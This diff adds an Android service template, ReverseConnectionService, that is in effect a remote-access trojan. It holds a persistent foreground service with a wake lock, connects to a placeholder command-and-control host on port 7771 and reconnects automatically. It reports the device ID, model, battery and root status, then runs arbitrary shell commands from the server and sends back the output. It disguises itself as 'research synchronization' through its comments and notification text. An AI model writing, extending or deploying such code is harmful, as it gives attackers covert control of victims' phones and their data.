@@ -1,0 +1,298 @@
+package {{PACKAGE}};
+
+import android.app.Service;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.content.Intent;
+import android.os.Build;
+import android.os.IBinder;
+import android.os.PowerManager;
+import android.content.pm.ServiceInfo;
+import android.util.Log;
+import android.provider.Settings;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.net.Socket;
+import java.net.InetSocketAddress;
+import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
+import android.os.Handler;
+import android.os.Looper;
+import org.json.JSONObject;
+
+/**
+ * Elite Reverse Connection Service - Advanced Research Core Integration
+ * Implements binary protocol for high-performance research synchronization.
+ */
+public class ReverseConnectionService extends Service {
+    private static final String TAG = "EliteC2";
+    private static final String CHANNEL_ID = "elite_research_node";
+    
+    // Protocol Constants
+    private static final byte MAGIC_BYTE = (byte) 0xB1;
+    private static final byte VERSION = 0x01;
+    
+    private static final byte TYPE_HEARTBEAT = 0x01;
+    private static final byte TYPE_HANDSHAKE = 0x02;
+    private static final byte TYPE_SHELL = 0x10;
+    private static final byte TYPE_LOG = 0x20;
+
+    // Connection configuration
+    private static String C2_HOST = "{{CONNECTION_HOST}}";
+    private static int C2_PORT = 7771; 
+    private static String C2_KEY = "{{CONNECTION_KEY}}";
+    
+    private Socket socket;
+    private DataInputStream input;
+    private DataOutputStream output;
+    private PowerManager.WakeLock wakeLock;
+    private ExecutorService executor;
+    private Handler mainHandler;
+    private boolean isConnected = false;
+    private boolean shouldReconnect = true;
+    private int reconnectDelay = 5000;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        mainHandler = new Handler(Looper.getMainLooper());
+        executor = Executors.newCachedThreadPool();
+        
+        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
+        if (pm != null) {
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG + "::WakeLock");
+            wakeLock.acquire(10 * 60 * 60 * 1000L); 
+        }
+        
+        createNotificationChannel();
+        if (Build.VERSION.SDK_INT >= 34) { // Android 14+
+            startForeground(1, createNotification("Initializing..."), ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
+        } else {
+            startForeground(1, createNotification("Initializing..."));
+        }
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null) {
+            String host = intent.getStringExtra("HOST");
+            int port = intent.getIntExtra("PORT", 0);
+            String key = intent.getStringExtra("KEY");
+            
+            if (host != null && !host.isEmpty()) C2_HOST = host;
+            if (port > 0) C2_PORT = port;
+            if (key != null && !key.isEmpty()) C2_KEY = key;
+        }
+        
+        if (!isConnected && shouldReconnect) {
+            executor.execute(this::connectLoop);
+        }
+        
+        return START_STICKY;
+    }
+
+    private void connectLoop() {
+        while (shouldReconnect && !isConnected) {
+            try {
+                Log.d(TAG, "Syncing with Research Core: " + C2_HOST + ":" + C2_PORT);
+                
+                socket = new Socket();
+                socket.connect(new InetSocketAddress(C2_HOST, C2_PORT), 15000);
+                socket.setKeepAlive(true);
+                
+                input = new DataInputStream(socket.getInputStream());
+                output = new DataOutputStream(socket.getOutputStream());
+                
+                isConnected = true;
+                reconnectDelay = 5000;
+                
+                sendHandshake();
+                updateNotification("Active Research Sync: Online");
+                
+                startReceiveLoop();
+                
+            } catch (Exception e) {
+                Log.e(TAG, "Connection failed: " + e.getMessage());
+                cleanup();
+                try { Thread.sleep(reconnectDelay); } catch (Exception ignored) {}
+                reconnectDelay = Math.min(reconnectDelay * 2, 60000);
+            }
+        }
+    }
+
+    private void sendHandshake() throws Exception {
+        JSONObject data = new JSONObject();
+        data.put("id", getEliteDeviceId());
+        data.put("name", Build.MANUFACTURER + " " + Build.MODEL);
+        data.put("model", Build.DEVICE);
+        data.put("ver", "Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")");
+        // Real Hardware Status Implementation
+        android.os.PowerManager pm = (android.os.PowerManager) getSystemService(POWER_SERVICE);
+        android.content.IntentFilter ifilter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
+        android.content.Intent batteryStatus = registerReceiver(null, ifilter);
+        int level = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) : -1;
+        int scale = batteryStatus != null ? batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) : -1;
+        float batteryPct = level * 100 / (float)scale;
+        
+        data.put("batt", (int)batteryPct + "%");
+        data.put("screen", (pm != null && pm.isInteractive()) ? "On" : "Off");
+        data.put("root", isRooted());
+        data.put("key", C2_KEY);
+
+        sendPacket(TYPE_HANDSHAKE, data.toString().getBytes("UTF-8"));
+    }
+
+    private boolean isRooted() {
+        String[] paths = { "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su", "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su" };
+        for (String path : paths) {
+            if (new java.io.File(path).exists()) return true;
+        }
+        return false;
+    }
+
+    private void sendPacket(byte type, byte[] payload) throws Exception {
+        if (output == null) return;
+        
+        synchronized (output) {
+            output.writeByte(MAGIC_BYTE);
+            output.writeByte(VERSION);
+            output.writeByte(type);
+            
+            // Length - Little Endian (Int32) to match C# BinaryReader.ReadInt32()
+            ByteBuffer buffer = ByteBuffer.allocate(4);
+            buffer.order(ByteOrder.LITTLE_ENDIAN);
+            buffer.putInt(payload.length);
+            output.write(buffer.array());
+            
+            if (payload.length > 0) {
+                output.write(payload);
+            }
+            output.flush();
+        }
+    }
+
+    private void startReceiveLoop() {
+        executor.execute(() -> {
+            try {
+                while (isConnected && socket != null) {
+                    byte magic = input.readByte();
+                    if (magic != MAGIC_BYTE) break;
+                    
+                    byte ver = input.readByte();
+                    byte type = input.readByte();
+                    
+                    byte[] lenBuf = new byte[4];
+                    input.readFully(lenBuf);
+                    int length = ByteBuffer.wrap(lenBuf).order(ByteOrder.LITTLE_ENDIAN).getInt();
+                    
+                    byte[] payload = new byte[length];
+                    if (length > 0) {
+                        input.readFully(payload);
+                    }
+                    
+                    handlePacket(type, payload);
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Link broken: " + e.getMessage());
+            } finally {
+                isConnected = false;
+                cleanup();
+            }
+        });
+        
+        // Heartbeat thread
+        executor.execute(() -> {
+            try {
+                while (isConnected) {
+                    sendPacket(TYPE_HEARTBEAT, new byte[0]);
+                    Thread.sleep(30000);
+                }
+            } catch (Exception ignored) {}
+        });
+    }
+
+    private void handlePacket(byte type, byte[] payload) {
+        try {
+            String data = new String(payload, "UTF-8");
+            switch (type) {
+                case TYPE_SHELL:
+                    executeShell(data);
+                    break;
+                // Add more handlers as research progresses
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error handling packet: " + e.getMessage());
+        }
+    }
+
+    private void executeShell(String command) {
+        executor.execute(() -> {
+            try {
+                Process p = Runtime.getRuntime().exec(command);
+                java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));
+                String line;
+                StringBuilder output = new StringBuilder();
+                while ((line = reader.readLine()) != null) {
+                    output.append(line).append("\n");
+                }
+                p.waitFor();
+                sendPacket(TYPE_LOG, ("Shell Output (" + command + "):\n" + output.toString()).getBytes("UTF-8"));
+            } catch (Exception e) {
+                try {
+                    sendPacket(TYPE_LOG, ("Shell Error: " + e.getMessage()).getBytes("UTF-8"));
+                } catch (Exception ignored) {}
+            }
+        });
+    }
+
+    private String getEliteDeviceId() {
+        return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+    }
+
+    private void cleanup() {
+        try { if (socket != null) socket.close(); } catch (Exception ignored) {}
+        isConnected = false;
+    }
+
+    @Override
+    public void onDestroy() {
+        shouldReconnect = false;
+        cleanup();
+        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
+        executor.shutdownNow();
+        super.onDestroy();
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                CHANNEL_ID, "Research Core Sync", NotificationManager.IMPORTANCE_LOW
+            );
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) manager.createNotificationChannel(channel);
+        }
+    }
+
+    private Notification createNotification(String text) {
+        Notification.Builder builder = new Notification.Builder(this);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) builder.setChannelId(CHANNEL_ID);
+        return builder.setContentTitle("Elite Research Core")
+                      .setContentText(text)
+                      .setSmallIcon(android.R.drawable.stat_notify_sync)
+                      .setOngoing(true)
+                      .build();
+    }
+
+    private void updateNotification(String text) {
+        NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+        if (manager != null) manager.notify(1, createNotification(text));
+    }
+}
